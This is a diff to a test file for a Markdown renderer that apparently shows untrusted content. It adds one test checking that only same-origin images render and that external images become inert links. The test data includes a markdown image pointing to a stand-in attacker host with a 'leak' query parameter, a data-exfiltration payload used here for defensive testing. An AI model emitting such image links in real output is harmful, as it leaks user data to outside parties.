@@ -65,4 +65,12 @@ describe('rendering untrusted text', () => {
     expect(() => render(<Markdown>{'| Field | Def'}</Markdown>)).not.toThrow();
     expect(() => render(<Markdown>{'## Unclosed **bold'}</Markdown>)).not.toThrow();
   });
+
+  it('shows an image only from Koala itself, and makes any other a link that loads nothing', () => {
+    const { container } = render(<Markdown>{'![chart](/api/artifacts/a1/raw)\n\n![tracker](https://evil.example/p.png?leak=abc)'}</Markdown>);
+    const images = [...container.querySelectorAll('img')].map((image) => image.getAttribute('src'));
+    expect(images).toEqual(['/api/artifacts/a1/raw']);
+    const link = screen.getByText(/tracker \(evil\.example\)/);
+    expect(link.closest('a')?.getAttribute('href')).toBe('https://evil.example/p.png?leak=abc');
+  });
 });
